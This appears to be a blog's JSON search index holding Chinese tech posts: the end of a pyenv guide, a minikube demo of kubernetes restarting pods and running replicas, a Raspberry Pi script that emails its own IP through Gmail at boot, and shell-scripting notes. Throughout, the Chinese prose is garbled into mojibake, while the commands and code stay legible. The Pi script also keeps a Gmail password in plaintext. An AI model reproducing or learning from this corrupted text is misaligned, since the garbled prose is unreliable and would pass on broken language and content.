~/.zshrc`\n\né‡æ–°è¼‰å…¥ shellï¼š\n\n`source ~/.zshrc`\n\né‡æ–°ç¢ºèªç’°å¢ƒè®Šæ•¸ï¼š\n\n`echo $PATH`\n```\n/Users/yiyuchang/.pyenv/shims:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n```\n\nå¯ä»¥ç™¼ç¾å®¶ç›®éŒ„ä¸‹å¤šäº†ä¸€å€‹ `.pyenv/shims` ç®¡ç†é€™äº›å¥—ä»¶ï¼Œé€™ä¹Ÿæ˜¯ `pyenv` é€²è¡Œç¥ç§˜é­”æ³•çš„åœ°æ–¹ ğŸ§™â€â™‚ï¸\n\n## é–‹å§‹ä½¿ç”¨ pyenv\n\nç¢ºèªç›®å‰ Python ç‰ˆæœ¬ç‚ºç³»çµ±ç‰ˆæœ¬ï¼š\n\n`pyenv global`\n```\nsystem\n```\n\né¡¯ç¤ºå¯å–ç”¨çš„ Python ç‰ˆæœ¬\n`pyenv install --list`\n```\nAvailable versions:\n  2.1.3\n  2.2.3\n  2.3.7\n  2.4.0\n  2.4.1\n  (ç•¥)\n  stackless-3.4-dev\n  stackless-3.4.1\n  stackless-3.4.2\n  stackless-3.4.7\n  stackless-3.5.4\n```\n\nè£¡é¢æœ‰å„å¼å„æ¨£çš„ Python interpreterï¼Œåœ¨é€™é‚Šï¼Œæˆ‘æƒ³ä½¿ç”¨å®˜æ–¹çš„ 3.8.1 ç‰ˆæœ¬ï¼Œå…ˆé€²è¡Œå®‰è£ï¼š\n\n`pyenv install 3.8.1`\n```\npython-build: use openssl@1.1 from homebrew\npython-build: use readline from homebrew\nDownloading Python-3.8.1.tar.xz...\n-> https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz\nInstalling Python-3.8.1...\npython-build: use readline from homebrew\npython-build: use zlib from xcode sdk\nInstalled Python-3.8.1 to /Users/yiyuchang/.pyenv/versions/3.8.1\n```\n\næŸ¥çœ‹ç›®å‰æœ¬åœ°ç«¯æ‰€æœ‰çš„ Python ç‰ˆæœ¬ï¼ˆæœ‰æ˜Ÿè™Ÿä»£è¡¨ç›®å‰æ­£åœ¨ä½¿ç”¨ï¼‰ï¼š\n\n`pyenv versions`\n```\n* system (set by /Users/yiyuchang/.pyenv/version)\n  3.8.1\n```\n\nå°‡ Python åˆ‡æ›åˆ°å‰›æ‰ä¸‹è¼‰çš„ 3.8.1ï¼š\n\n`pyenv global 3.8.1`\n`pyenv versions`\n```\n  system\n* 3.8.1 (set by /Users/yiyuchang/.pyenv/version)\n```\n\nåˆ‡æ›ä¸ä¸€å®šè¦ä½¿ç”¨ `global`, `global` ä»£è¡¨å…¨åŸŸçš„ Python ç‰ˆæœ¬ï¼Œå¦å¤–å…©ç¨®æ–¹å¼`local` æˆ–æ˜¯ `shell` æœ‰èˆˆè¶£çš„æœ‹å‹å¯ä»¥å»äº†è§£ä¸€ä¸‹ï¼Œå¯ä»¥æ›´å½ˆæ€§çš„é€²è¡Œ Python ç‰ˆæœ¬ç®¡ç†\n\næ¥è‘—ç¢ºèª Python æ˜¯ä¸æ˜¯çœŸçš„åˆ‡æ›åˆ°æˆ‘å€‘å‰›æ‰ä¸‹è¼‰çš„ `3.8.1` äº†ï¼š\n\n`which python`\n```\n/Users/yiyuchang/.pyenv/shims/python\n```\n\n`python`\n```\nPython 3.8.1 (default, Jan 11 2020, 12:25:19)\n[Clang 11.0.0 (clang-1100.0.33.16)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>>\n```\n\nå¤§åŠŸå‘Šæˆï¼å¦‚æ­¤ä¸€ä¾†ä¹‹å¾Œå°±å¯ä»¥è¼•é¬†åœ°åœ¨ä¸åŒå°ˆæ¡ˆä¸‹ä½¿ç”¨ Python äº†ã€‚ä¸éå»ºè­°åœ¨ä¸åŒå°ˆæ¡ˆé‚„æ˜¯è¦ä½¿ç”¨ `virtualenv` ä¾†ç®¡ç†ï¼Œå¦å‰‡å¥—ä»¶å…¨éƒ¨æœƒè£åœ¨æœ¬æ©Ÿçš„å…¨åŸŸçš„ Python ç’°å¢ƒä¸Šï¼Œå¦‚æœä¸åŒå°ˆæ¡ˆè¦ç”¨åˆ°ä¸åŒç‰ˆæœ¬çš„å¥—ä»¶ï¼Œåˆæœƒè®Šå¾—ä¸€åœ˜ç³Ÿï¼","tags":["python","macos"]},{"title":"å¿«é€Ÿé«”é©— kubernetes çš„å¼·å¤§ä¹‹è™•","url":"/2020/01/08/","content":"\n## å‰è¨€\n\nå®¹å™¨æŠ€è¡“è¿‘å¹´ä¾†éå¸¸æµè¡Œï¼Œç›¸ä¿¡å„ä½åœ¨ä¸åŒåœ°æ–¹å¤šå°‘æœ‰è½é `kubernetes`ï¼ˆæˆ–æ˜¯å®ƒçš„ç°¡ç¨± `k8s`ï¼‰é€™é …æŠ€è¡“ã€‚ä½†æ˜¯å¾ˆå¤šäººäº†è§£ `k8s` ä¹‹å¾Œæœƒè¢«é€™å€‹æŠ€è¡“åš‡åˆ°ï¼ŒåŸå› æ˜¯å› ç‚ºæœ‰å¤§é‡çš„åè©ï¼Œåƒæ˜¯ `Pod`, `Service` ç­‰ç­‰ï¼ˆé€™äº›å…ƒä»¶æ•¸é‡é«˜é” 60 å¤šç¨®ï¼‰ï¼Œç„¶å¾Œåˆæœ‰ä¸€å¤§å †çš„æ¶æ§‹åœ–ï¼Œå¾ˆå¤šäººå¯èƒ½é‚„æ²’é–‹å§‹å°±å…ˆæ”¾æ£„äº†ã€‚\n\né€™ç¯‡æ–‡ç« çš„ç›®çš„æ²’æœ‰è¦æ•™å¤§å®¶äº†è§£ `k8s` èƒŒå¾Œçš„è§€å¿µï¼Œè€Œæ˜¯è¦é€éç°¡å–®çš„å°å¯¦é©—ä¾†è®“å¤§å®¶äº†è§£ `k8s` çš„ä½œç”¨åˆ°åº•ç‚ºä½•ï¼Ÿè®“å¤§å®¶æœ‰é»æ„Ÿè¦ºï¼Œå¾ŒçºŒå¦‚æœå„ä½è¦æ·±å…¥äº†è§£ï¼Œå¯èƒ½ä¹Ÿæœƒæœ‰é»å¹«åŠ©ã€‚\n\nç°¡å–®ä¾†èªª `k8s` æ˜¯ä¸€é …å¯ä»¥ç®¡ç†å®¹å™¨çš„æŠ€è¡“ï¼Œè€Œä¸”å¯ä»¥åˆ†æ•£å¼çš„ç®¡ç†ã€‚æ„æ€å°±æ˜¯å®¹å™¨æ›æ‰ä¹‹å¾Œ `k8s` æœƒè‡ªå‹•åµæ¸¬ä¸¦ä¸”è®“å®¹å™¨é‡æ–°å•Ÿå‹•ã€‚ç•¶ç„¶é‚„æœ‰éå¸¸å¤šçš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸»è¦çš„æ ¸å¿ƒç›®çš„å°±æ˜¯ä¿æŒæ‡‰ç”¨ç¨‹å¼çš„ `é«˜å¯ç”¨æ€§ï¼ˆhigh availabilityï¼‰`ï¼ˆç°¡ç¨± HAï¼‰ã€‚\n\næœ¬ç¯‡å¯¦é©—æœƒé€éä¸€å€‹ç°¡å–®ä¾‹å­ä¾†è®“å¤§å®¶çœ‹åˆ° `k8s` é”æˆé«˜å¯ç”¨æ€§çš„æˆæ•ˆã€‚\n\n## å¯¦é©—å¿…å‚™\n\n- docker\n- minikube\n\n## ä¸€èˆ¬å®¹å™¨\n\nåœ¨é–‹å§‹ä¹‹å‰ï¼Œå¤§å®¶å¯ä»¥å…ˆè·‘é€™å€‹å®¹å™¨ï¼ˆyiyu0x/current-timeï¼‰èµ·ä¾†ç©ç©çœ‹\n\n`docker run -d -p 3000:3000 yiyu0x/current-time`\n\né€™å€‹å®¹å™¨æœƒåœ¨ localhost 3000 port é–‹ä¸€å€‹é¡¯ç¤ºç›®å‰æ™‚é–“çš„ APIï¼š\n\nå¦‚æœé †åˆ©çš„è©±è¨ªå• `localhost:3000` æœƒå¾—åˆ°ï¼š\n```\nCurrent time is 4:2:48\n```\n\næˆ‘å€‘å¯ä»¥å¾Œé `docker ps` ä¾†ç¢ºèªé€™å€‹ container æ­£ç¢ºç„¡èª¤çš„é‹ä½œï¼š\n\n```\n~/dev/k8s-post/my-api â¯ docker ps\nCONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES\nd5662a916aed        yiyu0x/current-time   \"docker-entrypoint.sâ€¦\"   10 seconds ago      Up 8 seconds        0.0.0.0:3000->3000/tcp   tender_hypatia\n```\n\n\nä½†æ˜¯æˆ‘å€‘å¦‚æœå»æˆ³ `localhost:3000/bye` é€™å€‹ä½ç½®çš„è©±ï¼Œæœƒç™¼ç¾å®¹å™¨æ›æ‰äº†ï¼š\n\n```\n~/dev/k8s-post/my-api â¯ docker ps\n\n```\n\né€™å€‹è¡Œç‚ºæ¨¡æ“¬å‡ºç•¶æ‡‰ç”¨ç¨‹å¼æ„å¤–çµæŸçš„æƒ…æ³ã€‚\n\n## å°å…¥ k8s\n\nå»ºç«‹ä¸€å€‹ `pod` å…§å®¹æ˜¯å‰›æ‰çš„ `current-time` çš„ `container`ï¼š\n`kubectl run --image=yiyu0x/current-time curr-time --generator=run-pod/v1`\n\n```\n~/dev/k8s-post/my-api â¯ kubectl get po\nNAME        READY   STATUS              RESTARTS   AGE\ncurr-time   0/1     ContainerCreating   0          16s\n```\n\nå°‡ä»– `expose` å‡ºå»ï¼š\n\n`kubectl expose pod curr-time --port 3000 --type=NodePort`\n\nå–å¾—ä½ç½®ä¸¦ä¸”è¨ªå•ï¼š\n```\n~/dev/k8s-post/my-api â¯ minikube service curr-time --url\nhttp://192.168.64.6:30948\n```\n\næ­¤æ™‚å»ºè­°å†é–‹ä¸€å€‹ terminal çš„ tab ä½¿ç”¨:\n`watch kubectl get po`\nï¼ˆæ„Ÿè¬å­¸é•· Jerry Wang æŒ‡æ­£ï¼Œå¯ä»¥ç”¨ `kubectl get po -w` å°±ä¸ç”¨é¡å¤–å®‰è£ watch æŒ‡ä»¤äº†ï¼ï¼‰\n\nç›£æ¸¬è©² `pod` çš„ç‹€æ…‹ä¸¦ä¸”å»æˆ³ `http://192.168.64.6:30948/bye`\n\nä½ æœƒç™¼ç¾å®¹å™¨æ›æ‰å¾Œå¹¾ç§’é˜ï¼Œåˆè‡ªå·±é‡æ–°è·‘èµ·ä¾†äº†ï¼Œä¸¦ä¸” RESTARTS çš„æ•¸é‡è®Šæˆ 1 äº†ï¼ˆåŸæœ¬æ˜¯ 0ï¼‰ï¼š\n\n```\nNAME        READY   STATUS    RESTARTS   AGE\ncurr-time   1/1     Running   1          8m56s\n```\n\n## æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§ - replicas\n\né€éä»¥ä¸Šä¾‹å­å·²ç¶“å¯ä»¥æ„Ÿè¦ºåˆ° `k8s` çš„å¨åŠ›ï¼Œä½†æ˜¯å…¶å¯¦ `docker` æœ¬èº«å°±å¯ä»¥ç›£æ¸¬å®¹å™¨çš„ç‹€æ…‹ä¸¦ä¸”é‡æ–°å•Ÿå‹•äº†ã€‚`k8s` æ›´å¼·å¤§çš„åœ°æ–¹åœ¨æ–¼å®ƒå¯ä»¥ä¸€æ¬¡å»ºç«‹å¤šå€‹ `pod` ä¸¦ä¸”åœ¨ä¸€å€‹ `pod` æ›æ‰æ™‚é€é `loadbalancer` é¦¬ä¸ŠæŠŠæµé‡åˆ‡æ›åˆ°å…¶ä»– `pod` ä¸­ï¼Œé€™æ¨£å­ä½¿ç”¨è€…å®Œå…¨æ„Ÿè¦ºä¸å‡ºä¾†åŸä¾†æœå‹™æœ‰æ›æ‰éã€‚\n\nå»ºç«‹ `replicas`ï¼š\n`kubectl run curr-time --image=yiyu0x/current-time --replicas=3 --port 3000`\n\nå°å¤–æ‰“é–‹ï¼š\n`kubectl expose deployment curr-time --port=3000 --type=NodePort`\n\nä¸€æ¨£é€é `watch kubectl get po` ä¾†ç›£æ§ `pod`ï¼š\n\nï¼ˆ2019/1/17 æ›´æ–°ï¼šæˆ–æ˜¯ç”¨ `kubectl get po -w`ï¼‰\n```\nEvery 2.0s: kubectl get po\n\nNAME                         READY   STATUS    RESTARTS   AGE\ncurr-time-6f9cb4fdf9-crc66   1/1     Running   3          7m41s\ncurr-time-6f9cb4fdf9-hbkx5   1/1     Running   2          7m41s\ncurr-time-6f9cb4fdf9-s742x   1/1     Running   2          7m41s\n```\n\nç„¶å¾Œæˆ³ä¸€ä¸‹ API çš„ bye ä½ç½®ï¼Œæœƒç™¼ç¾ï¼š\n```\nEvery 2.0s: kubectl get po\n\nNAME                         READY   STATUS      RESTARTS   AGE\ncurr-time-6f9cb4fdf9-crc66   0/1     Completed   3          8m40s\ncurr-time-6f9cb4fdf9-hbkx5   1/1     Running     2          8m40s\ncurr-time-6f9cb4fdf9-s742x   1/1     Running     2          8m40s\n```\n\nä¸‰å€‹æœå‹™ä¸­çš„å®¹å™¨ä¸€å€‹æ›æ‰å…¶ä»–å…©å€‹é‚„æ˜¯æ­£å¸¸é‹ä½œä¸­ï¼Œä½¿ç”¨è€…æ ¹æœ¬æ„Ÿè¦ºä¸å‡ºä¾†ï¼ˆæµé‡æœƒè¢«å°å…¥åˆ°æ­£å¸¸é‹ä½œçš„ pod ä¸­ï¼‰å¾Œé¢çš„å®¹å™¨åŸä¾†æ›æ‰äº†ï¼\n\n## æ›´æ›´æ›´å¼·å¤§çš„é«˜å¯ç”¨æ€§\n\nä»¥ä¸Šä¾‹å­ä½¿ç”¨ `minikube` ä¾†å¯¦é©—ï¼Œåªæœ‰ä¸€å€‹ç¯€é»ã€‚çœŸå¯¦æƒ…æ³ç”šè‡³å¯ä»¥æŠŠå¥½å¹¾å°æ©Ÿå™¨å…¨éƒ¨çµ¦ `k8s` é€²è¡Œç®¡ç†ã€‚é€™æ¨£å­ç”šè‡³é€£æ©Ÿå™¨æ›æ‰éƒ½å¯ä»¥ä¿è­‰æœå‹™ä¸ä¸­æ–·ï¼Œé€™æ‰æ˜¯çœŸæ­£çš„é«˜å¯ç”¨æ€§ï¼\n\næ–‡ä¸­é€éä¸€å€‹ä¾‹å­è®“è®€è€…äº†è§£åˆ° `k8s` çš„ç”¨è™•ï¼Œä½†æ˜¯æ²’æœ‰è§£é‡‹å¾ˆå¤šå•é¡Œï¼Œåƒæ˜¯ï¼š\n\n- ç‚ºä»€éº¼å»ºç«‹çš„æ˜¯ `pod` ä¸æ˜¯ `container`ï¼Ÿ\n- ç‚ºä»€éº¼éœ€è¦ `expose`ï¼Ÿ\n- `minikube` æ˜¯ä»€éº¼ï¼Ÿ\n\nåŸå› åœ¨æ–¼æˆ‘èªç‚ºå…ˆé«”é©—ä¸€æ¬¡é€™å€‹æŠ€è¡“çš„æ•ˆæœå†å»å­¸ç¿’é€™å€‹æŠ€è¡“ç´°è§£ï¼Œæœ‰æ™‚å€™å¯èƒ½æœƒæ¯”èµ·ç›´æ¥å»è¨˜æ†¶é‚£äº›ç¡¬ç”Ÿç”Ÿçš„åè©ä¾†å¾—æœ‰æ•ˆæœï¼Œæ‰€ä»¥çœ‹å®Œé€™ç¯‡æ–‡ç« ä¹‹å¾Œï¼Œå¦‚æœä¸å¤ªæ‡‚è£¡é¢çš„ç´°è§£å¯ä»¥å†å»çœ‹å®˜æ–¹æ–‡ä»¶æˆ–æ˜¯æŸ¥é–±å…¶ä»– `k8s` çš„æ¦‚å¿µè¬›è§£æ–‡ç« ã€‚\n\nçœ‹å®Œä¹‹å¾Œå†å›ä¾†è‡ªå·±ç©éä¸€æ¬¡ï¼Œæˆ‘ç›¸ä¿¡æœƒæœ‰ä¸ä¸€æ¨£çš„æ„Ÿè¦ºçš„ï¼","tags":["kubernetes"]},{"title":"Raspberry Pi é–‹æ©Ÿæ™‚è‡ªå‹•å¯„é€ IP è¨­å®š","url":"/2019/12/15/","content":"\n## å‰è¨€\n\nåœ¨ä½¿ç”¨ Raspberry Piï¼ˆä»¥ä¸‹ç°¡ç¨±ç‚º Piï¼‰æ™‚ï¼Œå¦‚æœæ¯ä¸€æ¬¡éƒ½è¦ä½”ç”¨ä¸€å€‹é›»è…¦çš„ USB port éå¸¸ä¸æ–¹ä¾¿ï¼Œè€Œä¸”é›»è…¦è¼¸å‡ºé›»å£“ä¸ä¸€å®šå¤ ï¼Œå¦‚æœæ¢ä»¶å…è¨±ï¼Œæˆ‘å€‘æœƒå¸Œæœ›å°‡ Pi ç”¨è®Šå£“å™¨ç¨ç«‹æ’åœ¨æ’åº§ä¸Šï¼Œå†ä½¿ç”¨ SSH é€™é¡çš„å·¥å…·é ç«¯æ“ä½œã€‚\n\nä½†æ˜¯è¦ SSH å‰å¿…é ˆè¦çŸ¥é“ IPï¼Œæˆ‘å€‘å¸Œæœ›è®“ Pi åœ¨é–‹æ©Ÿå®Œç•¢å¾Œè‡ªå‹•å°‡ IP ç™¼é€è‡³è‡ªå·±çš„ä¿¡ç®±ã€‚å¦‚æ­¤ä¸€ä¾†ä¹‹å¾Œåªè¦ Pi æœ‰å–å¾— IP çš„è©±å°±æœƒè‡ªå‹•å¯„ä¿¡ï¼Œæˆ‘å€‘ä¸å¿…å†é€é USB ç·šæä»¥åŠ screen æŒ‡ä»¤é€²è¡Œé€£ç·šã€‚\n\n## å¯„ä¿¡æ–¹å¼\n\nè¦å¯„ä¿¡çš„æ–¹å¼æœ‰å…©ç¨®ï¼Œä¸€ç¨®æ˜¯ç›´æ¥æ¶è¨­ SMTP server ä¾†å¯„ä¿¡ï¼Œä½†æ˜¯é€šå¸¸æ”¶ä¿¡æ–¹æœƒå› ç‚ºè©²ä¿¡ä»¶çš„ä¾†æºæ²’æœ‰ Domain Name è€Œä¸æ”¶ä¿¡ï¼ˆæƒ¡æ„éƒµä»¶ï¼‰ï¼Œæˆ–æ˜¯ç›´æ¥å°‡ä¿¡ç®±æ”¾ç½®åƒåœ¾ä¿¡ä»¶è™•ç†ï¼Œæ‰€ä»¥ä¸å»ºè­°æ­¤ç¨®æ–¹å¼ã€‚\n\nç¬¬äºŒç¨®æ–¹æ³•å‰‡æ˜¯åˆ©ç”¨ Gmail æä¾›çš„ SMTP server ä¾†å¯„ä¿¡ï¼ˆè¦è‡ªå‚™ Gmail å¸³è™Ÿï¼‰ã€‚è©²æ–¹å¼éœ€è¦å…ˆåˆ° [Google ä½å®‰å…¨æ€§æ‡‰ç”¨ç¨‹å¼å­˜å–æ¬Š](https://myaccount.google.com/lesssecureapps) å…è¨±ä½å®‰å…¨æ€§æ‡‰ç”¨ç¨‹å¼ä¾†å­˜å–ä½ çš„å¸³æˆ¶ï¼Œè«‹æ–Ÿé…Œä½¿ç”¨ã€‚\n\n## å¯„ä¿¡è…³æœ¬\n\nè«‹å°‡ä»¥ä¸‹æ¬„ä½è‡ªè¡Œå¡«å…¥ï¼Œä¸¦ä¸”è³¦äºˆè©²è…³æœ¬åŸ·è¡Œæ¬Šé™ã€‚ï¼ˆå»ºè­°ä½¿ç”¨ Python2ï¼‰\n\n-   to\n-   gmail_user\n-   gmail_password\n\n```python\n#!/usr/bin/python\nimport subprocess\nimport smtplib\nimport socket\nfrom email.mime.text import MIMEText\nimport datetime\n\n# Which email address want to send\nto = 'XXX'\n\n# Using specific gmail account\ngmail_user = 'XXX'\ngmail_password = 'XXX'\n\n# SMTP command\nsmtpserver = smtplib.SMTP('smtp.gmail.com', 587)\nsmtpserver.ehlo()\nsmtpserver.starttls()\nsmtpserver.login(gmail_user, gmail_password)\ntoday = datetime.date.today()\n\n# Linux Specific shell command\narg='ip route list'\np=subprocess.Popen(arg,shell=True,stdout=subprocess.PIPE)\ndata = p.communicate()\nsplit_data = data[0].split()\nipaddr = split_data[split_data.index('src')+1]\nmy_ip = 'Your ip is %s' %  ipaddr\nmsg = MIMEText(my_ip)\nmsg['Subject'] = 'IP For RaspberryPi on %s' % today.strftime('%b %d %Y')\nmsg['From'] = gmail_user\nmsg['To'] = to\nsmtpserver.sendmail(gmail_user, [to], msg.as_string())\nsmtpserver.quit()\n```\n\n## é–‹æ©Ÿæ™‚åŸ·è¡Œ\n\nåœ¨ `/etc/rc.local` ä¸­åŸ·è¡Œ Scriptï¼ˆmail.pyï¼‰\n\n```bash\n_IP=$(hostname -I) || true\nif [ \"$_IP\" ]; then\n  printf \"My IP address is %s\\n\" \"$_IP\"\n  /home/pi/mail.py\nfi\n\nexit 0\n```\n","tags":["raspberry_pi"]},{"title":"Shell Script ä¸­é‚£äº›éŒ¯éçš„äº‹","url":"/2019/11/28/","content":"\n# å‰è¨€\n\nShell Script æƒ³å¿…å¤§å®¶éƒ½æœ‰ä½¿ç”¨éï¼Œå³ä½¿æ²’æœ‰çœŸçš„å¯« scriptï¼Œå¤šå°‘ä¹Ÿæœƒæœ‰åœ¨ command line ä¸­é€é pipe æˆ–æ˜¯ and æ¢ä»¶å¥ä¾†å°‡ä¸åŒçš„æŒ‡ä»¤çµåˆåœ¨ä¸€èµ·çš„ç¶“é©—ã€‚\n\nä¹Ÿå› ç‚º Shell å¦‚æ­¤å¹³å‡¡ï¼Œè²¼è¿‘ä¸€èˆ¬ç’°å¢ƒï¼Œåè€Œå¾ˆå°‘æœ‰äººèŠ±æ™‚é–“å»èªçœŸäº†è§£é Shellã€‚æˆ‘è‡ªå·±ä¹Ÿæ˜¯é€™ç¨®äººï¼Œæ–¼æ˜¯è¿‘æœŸè®€äº†ã€Šç²¾é€š shell ç¨‹å¼è¨­è¨ˆ ç¬¬å››ç‰ˆã€‹å¾Œï¼Œè¨˜éŒ„äº†ä¸€äº›è‡ªå·±å¾ä¾†æ²’æœ‰äº†è§£éçš„ç´°ç¯€ã€‚\n\n## æª”æ¡ˆåç¨±æ›¿æ›\n\n### \\* å­—å…ƒ\n\nåœ¨ Shell ä¸­ï¼ˆæ­¤ç¯‡æ–‡ç« ç”¨ Bash ä¾†ç•¶ä¾‹å­ï¼‰ï¼Œ`*` æœƒè¢«è½‰è­¯æˆè©²ç›®éŒ„ä¸‹æ‰€æœ‰æª”æ¡ˆçš„åç¨±ã€‚ï¼ˆé€™ä»¶äº‹æ˜¯ç”± Shell é å…ˆè™•ç†å¥½ã€‚ï¼‰\n\nç•¶ `echo *` æ™‚ï¼Œå¯¦éš›ä¸Šæœƒå…ˆæŠŠ \\* æ›¿æ›æˆæª”åï¼ˆå‡å¦‚æœ‰ a b c ä¸‰å€‹æª”æ¡ˆï¼‰ï¼Œç„¶å¾ŒåŸ·è¡Œ `echo a b c` å°å‡º `a b c`ã€‚\n\nä»¥ echo æŒ‡ä»¤çš„è§’åº¦ï¼Œæ˜¯æ²’æœ‰è¾¦æ³•è¾¨åˆ¥ a b c æ˜¯ç”± `*` æ›¿æ›è€Œä¾†ï¼Œecho åªçŸ¥é“è‡ªå·±æ”¶åˆ°ä¸‰å€‹åƒæ•¸åˆ†åˆ¥ç‚º a, b, cã€‚\n\n### ? å­—å…ƒ\n\n? å¯ä»¥å°æ‡‰å–®ä¸€å­—å…ƒï¼Œä¾‹å¦‚ ?? å¯ä»¥å°æ‡‰å‡ºå…¨éƒ¨å‰›å¥½å…©å­—å…ƒçš„æª”åï¼Œå¦‚æœæƒ³è¦åŒ¹é…å…©å€‹å­—å…ƒä»¥ä¸Šï¼ˆåŒ…å«å…©å€‹å­—å…ƒï¼‰çš„æª”åå¯ä»¥ä½¿ç”¨ ??\\*\n\nè©²é…å°æ–¹å¼èˆ‡ Regular Expression é¡ä¼¼ï¼Œä½†ä¸¦é Regular Expressionã€‚\n\n## è¼¸å…¥é‡å°å‘\n\nåœ¨ä¸€è¡ŒæŒ‡ä»¤é–‹å§‹åŸ·è¡Œæ™‚ï¼Œå…¶å¯¦ Shell å·²ç¶“é»˜é»˜å¹«æˆ‘å€‘åšäº†ä¸€äº›äº‹æƒ…ã€‚\n\n```bash\nwc -l users # 5 s.sh\nwc -l < s.sh # 5\n```\n\nä»¥ä¸Šå…©è€…çš„è¼¸å‡ºä¸¦ä¸ç›¸åŒï¼Œå·®ç•°åœ¨æ–¼å¾Œè€…æ˜¯é€éæ¨™æº–è¼¸å…¥å‚³å…¥ï¼Œwc ç¨‹å¼ä¸¦ç„¡æ³•å¾—çŸ¥æ˜¯å“ªä¸€å€‹æª”æ¡ˆå‚³é€²ä¾†çš„å…§å®¹ï¼Œæ‰€ä»¥ç„¡å¾å¾—çŸ¥æª”åã€‚\n\n## è®Šæ•¸ç›¸é—œ\n\n### è®Šæ•¸\n\n-   è®Šæ•¸å‹æ…‹åªæœ‰å­—ä¸²è®Šæ•¸\n-   å®£å‘Šè®Šæ•¸æ™‚ = è™Ÿå·¦å³ä¸èƒ½æœ‰ç©ºæ ¼\n\n```bash\na = hello # éŒ¯èª¤\na=hello   # æ­£ç¢º\n```\n\n-   ç•¶å­—ä¸²ä»£æœ‰ç©ºæ ¼æ™‚ï¼Œè¦ç”¨ `'` æˆ– `\"` ä¾†å¤¾ä½å­—ä¸²\n-   å–®å¼•è™Ÿå¤¾ä½çš„å…§å®¹ä¸æœƒå†é€²è¡Œè½‰è­¯ï¼Œé›™å¼•è™Ÿçš„å…§å®¹æœƒå†é€²è¡Œè½‰è­¯\n-   \\$ å­—è™Ÿç”¨ä¾†å–å€¼ï¼ˆshell æœƒé€²è¡Œæ›¿æ›ï¼‰\n\n```bash\nvar1=hi\necho '$var1' # $var1\necho \"$var1\" # hi\n```\n\n### unset\n\nunset æ˜¯ä¸€å€‹å¥½ç”¨çš„æŒ‡ä»¤ï¼Œç”¨ä¾†æŠŠè®Šæ•¸å–æ¶ˆè¨­ç½®ï¼Œä¹Ÿå¯ä»¥å°‡ function, alias çš„è¨­å®šå–æ¶ˆï¼š\n\n```bash\nmsg=hello\necho $msg # hello\nunset msg\necho $msg #\n```\n\né‚„æœ‰ä¸€ç¨®å–æ¶ˆçš„æ–¹å¼ç‚ºæŒ‡å®šç©ºå€¼ï¼š\n\n```bash\nmsg=hello\necho $msg # hello\nmsg=      # ä¸æŒ‡å®š\necho $msg #\n```\n\n-   å–æ¶ˆ alias : `unset -a <alias-name>`\n-   å–æ¶ˆ function : `unset -f <func-name>`\n\n### \"$var\" èˆ‡ $var çš„å·®ç•°\n\nï¼ˆå‡è¨­ç›®éŒ„ä¸‹æœ‰ a b c ä¸‰å€‹æª”æ¡ˆï¼‰\n\n```bash\nvar=*\necho $var    # a b c\necho \"$var\"  # *\n```\n\nå› ç‚º `$var` æœƒæ›¿æ›æˆ `*` ï¼Œæ‰€ä»¥ `echo $var` æœƒå…ˆè¢« Shell æ›¿æ›æˆ `echo *` å†æ›¿æ›æˆ `echo a b c`ã€‚\n\nç„¶è€Œ `echo \"$var\"` æœ€å¾Œåƒ…æœƒè¢«æ›¿æ›æˆ `echo \"*\"` è€Œå°å‡º `*`ã€‚\n\nï¼ˆé›™å¼•è™Ÿåªæœƒè½‰è­¯è®Šæ•¸ï¼Œä¸æœƒè½‰è­¯ `*` ã€‚ï¼‰\n\nç”±ä¸Šè¿°ä¾‹å­å¯çŸ¥ï¼Œç‚ºä½•æ¯”è¼ƒå¥½çš„å¯«æ³•æ˜¯åœ¨å°å‡ºè®Šæ•¸æ™‚å¤–é¢å†åŒ…ä¸€å±¤é›™å¼•è™Ÿã€‚\n\n### å‘½ä»¤æ›¿æ›ï¼š`` èˆ‡ \\$()\n\né€™å…©å€‹åŒ…è£¹å­—ä¸²çš„æ–¹å¼æœƒè®“å­—ä¸²å…§å®¹ç•¶ä½œæŒ‡ä»¤ä¾†åŸ·è¡Œï¼š\n\n```bash\nvar=`date`\nvar2=$(date)\necho \"$var\"  # Mon Nov 25 16:56:47 CST 2019\necho \"$var2\" # Mon Nov 25 16:56:47 CST 2019\n```\n\nå·®ç•°åœ¨æ–¼ `$()` æ˜¯æ–°çš„æ–¹å¼ï¼Œå…©å€‹ ` å‰‡æ˜¯èˆŠçš„æ–¹å¼\n\n## å¸¸ç”¨æŒ‡ä»¤ä»¥åŠè¢«å¿½ç•¥çš„äº‹\n\n### echo\n\necho æŒ‡ä»¤æœƒç„¡è¦–ç©ºæ ¼ï¼ˆé™¤éä½ ç”¨å¼•è™Ÿå¤¾ä½å­—ä¸²ï¼‰å°‡ç©ºæ ¼ç•¶ä½œåˆ†é›¢ä¸åŒåƒæ•¸çš„åˆ†éš”ç¬¦è™Ÿï¼š\n\n```bash\necho a b  c    d   e # a b c d e\n```\n\n`-e` åƒæ•¸ç”¨ä¾†é–‹å•Ÿè½‰è­¯åŠŸèƒ½\n\n```bash\necho -e \"123\\n\" # 123\n                #\n# å› ç‚º echo æœ¬èº«æœƒæ›è¡Œï¼Œæ‰€ä»¥ \\n æœƒè®“ output æœ‰å…©å€‹æ›è¡Œ\n# \\c å¯ä»¥è®“ echo å»é™¤æ›è¡Œå­—å…ƒ\necho -e \"123\\c\" # 123 04:17:55 yiyu@afra tmp â†’\n# shell çš„ PS1 æœƒç·Šè²¼åœ¨ output ä¹‹å¾Œï¼ˆå› ç‚ºæ²’æœ‰æ›è¡Œå­—å…ƒï¼‰\n```\n\n### ls\n\nä½¿ç”¨ ls æŒ‡ä»¤ï¼Œæœƒåˆ—å‡ºè©²ç›®éŒ„ä¸‹æ‰€æœ‰æª”æ¡ˆï¼Œä½†ä¸æ˜¯ä¸€å€‹æª”æ¡ˆä¸€è¡Œï¼Œæƒ³è¦ä¸€å€‹æª”æ¡ˆä¸€è¡Œå°å‡ºï¼Œå¯ä»¥ä½¿ç”¨ `ls -1`\n\n## wc\n\nç”¨ä¾†æŸ¥çœ‹æª”æ¡ˆçš„å…§å®¹åŒ…è¡Œå¹¾åˆ—ã€å¹¾å€‹å–®å­—ã€å¹¾å€‹å­—å…ƒã€‚ä¸å¹¸çš„æ˜¯ wc çš„çµæœé–‹é 